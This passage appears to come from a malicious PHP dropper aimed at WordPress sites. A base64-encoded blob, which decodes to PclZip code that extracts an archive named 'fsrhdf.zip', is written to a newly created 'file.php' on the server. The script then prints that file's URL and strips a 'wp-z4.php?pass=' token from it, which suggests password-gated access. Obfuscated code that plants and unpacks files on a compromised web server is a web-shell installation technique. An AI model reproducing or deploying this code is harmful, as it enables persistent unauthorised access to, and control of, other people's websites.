dGhbJGpdKSAmJiAoJHZfbGlzdF9kaXJbJGldICE9ICcnKSAmJiAoICR2X2xpc3RfcGF0aFskal0gIT0gJycpKSAgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQoNCiAgICAkaSsrOw0KICAgICRqKys7DQogIH0NCg0KICBpZiAoJHZfcmVzdWx0KSB7DQogICAgd2hpbGUgKCgkaiA8ICR2X2xpc3RfcGF0aF9zaXplKSAmJiAoJHZfbGlzdF9wYXRoWyRqXSA9PSAnJykpICRqKys7DQogICAgd2hpbGUgKCgkaSA8ICR2X2xpc3RfZGlyX3NpemUpICYmICgkdl9saXN0X2RpclskaV0gPT0gJycpKSAkaSsrOw0KDQogICAgaWYgKCgkaSA+PSAkdl9saXN0X2Rpcl9zaXplKSAmJiAoJGogPj0gJHZfbGlzdF9wYXRoX3NpemUpKSB7DQogICAgICAkdl9yZXN1bHQgPSAyOw0KICAgIH0NCiAgICBlbHNlIGlmICgkaSA8ICR2X2xpc3RfZGlyX3NpemUpIHsNCiAgICAgICR2X3Jlc3VsdCA9IDA7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbENvcHlCbG9jaygkcF9zcmMsICRwX2Rlc3QsICRwX3NpemUsICRwX21vZGU9MCkNCnsNCiAgJHZfcmVzdWx0ID0gMTsNCg0KICBpZiAoJHBfbW9kZT09MCkNCiAgew0KICAgIHdoaWxlICgkcF9zaXplICE9IDApDQogICAgew0KICAgICAgJHZfcmVhZF9zaXplID0gKCRwX3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHBfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCRwX3NyYywgJHZfcmVhZF9zaXplKTsNCiAgICAgIEBmd3JpdGUoJHBfZGVzdCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICAgJHBfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogICAgfQ0KICB9DQogIGVsc2UgaWYgKCRwX21vZGU9PTEpDQogIHsNCiAgICB3aGlsZSAoJHBfc2l6ZSAhPSAwKQ0KICAgIHsNCiAgICAgICR2X3JlYWRfc2l6ZSA9ICgkcF9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICRwX3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAgICR2X2J1ZmZlciA9IEBnenJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGZ3cml0ZSgkcF9kZXN0LCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgICAkcF9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgICB9DQogIH0NCiAgZWxzZSBpZiAoJHBfbW9kZT09MikNCiAgew0KICAgIHdoaWxlICgkcF9zaXplICE9IDApDQogICAgew0KICAgICAgJHZfcmVhZF9zaXplID0gKCRwX3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHBfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCRwX3NyYywgJHZfcmVhZF9zaXplKTsNCiAgICAgIEBnendyaXRlKCRwX2Rlc3QsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAgICRwX3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgIH0NCiAgfQ0KICBlbHNlIGlmICgkcF9tb2RlPT0zKQ0KICB7DQogICAgd2hpbGUgKCRwX3NpemUgIT0gMCkNCiAgICB7DQogICAgICAkdl9yZWFkX3NpemUgPSAoJHBfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkcF9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAkdl9idWZmZXIgPSBAZ3pyZWFkKCRwX3NyYywgJHZfcmVhZF9zaXplKTsNCiAgICAgIEBnendyaXRlKCRwX2Rlc3QsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAgICRwX3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIFBjbFppcFV0aWxSZW5hbWUoJHBfc3JjLCAkcF9kZXN0KQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogIGlmICghQHJlbmFtZSgkcF9zcmMsICRwX2Rlc3QpKSB7DQoNCiAgICBpZiAoIUBjb3B5KCRwX3NyYywgJHBfZGVzdCkpIHsNCiAgICAgICR2X3Jlc3VsdCA9IDA7DQogICAgfQ0KICAgIGVsc2UgaWYgKCFAdW5saW5rKCRwX3NyYykpIHsNCiAgICAgICR2X3Jlc3VsdCA9IDA7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uKQ0Kew0KICANCiAgJHZfbGlzdCA9IGdldF9kZWZpbmVkX2NvbnN0YW50cygpOw0KICBmb3IgKHJlc2V0KCR2X2xpc3QpOyAkdl9rZXkgPSBrZXkoJHZfbGlzdCk7IG5leHQoJHZfbGlzdCkpIHsNCiAgICAkdl9wcmVmaXggPSBzdWJzdHIoJHZfa2V5LCAwLCAxMCk7DQogICAgaWYgKCggICAoJHZfcHJlZml4ID09ICdQQ0xaSVBfT1BUJykNCiAgICAgICAgIHx8ICgkdl9wcmVmaXggPT0gJ1BDTFpJUF9DQl8nKQ0KICAgICAgICAgfHwgKCR2X3ByZWZpeCA9PSAnUENMWklQX0FUVCcpKQ0KICAgICAgICAmJiAoJHZfbGlzdFskdl9rZXldID09ICRwX29wdGlvbikpIHsNCiAgICAgIHJldHVybiAkdl9rZXk7DQogICAgfQ0KICB9DQogIA0KICAkdl9yZXN1bHQgPSAnVW5rbm93bic7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoJHBfcGF0aCwgJHBfcmVtb3ZlX2Rpc2tfbGV0dGVyPXRydWUpDQp7DQogIGlmIChzdHJpc3RyKHBocF91bmFtZSgpLCAnd2luZG93cycpKSB7DQogICAgaWYgKCgkcF9yZW1vdmVfZGlza19sZXR0ZXIpICYmICgoJHZfcG9zaXRpb24gPSBzdHJwb3MoJHBfcGF0aCwgJzonKSkgIT0gZmFsc2UpKSB7DQogICAgICAgICRwX3BhdGggPSBzdWJzdHIoJHBfcGF0aCwgJHZfcG9zaXRpb24rMSk7DQogICAgfQ0KICAgIGlmICgoc3RycG9zKCRwX3BhdGgsICdcXCcpID4gMCkgfHwgKHN1YnN0cigkcF9wYXRoLCAwLDEpID09ICdcXCcpKSB7DQogICAgICAgICRwX3BhdGggPSBzdHJ0cigkcF9wYXRoLCAnXFwnLCAnLycpOw0KICAgIH0NCiAgfQ0KICByZXR1cm4gJHBfcGF0aDsNCn0NCg0KDQoNCg0KJGFyY2hpdmUgPSBuZXcgUGNsWmlwKCJmc3JoZGYuemlwIik7DQppZiAoJGFyY2hpdmUtPmV4dHJhY3QoKSA9PSAwKSB7DQpkaWUoIkVycm9yIDogIi4kYXJjaGl2ZS0+ZXJyb3JJbmZvKHRydWUpKTsNCn0NCmVsc2UNCnsNCmRpZSgiMTQyNTc1Njg1NiIpOwkNCn0="); 
file_put_contents("$path/$drname/file.php",$data2); 
//$host = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$host = 'http://'.$_SERVER['HTTP_HOST'];
$host2 = str_replace("wp-z4.php", "", $host);
$host2 = str_replace("?pass=$drname", "", $host2);
echo "$host2/$drname/file.php";
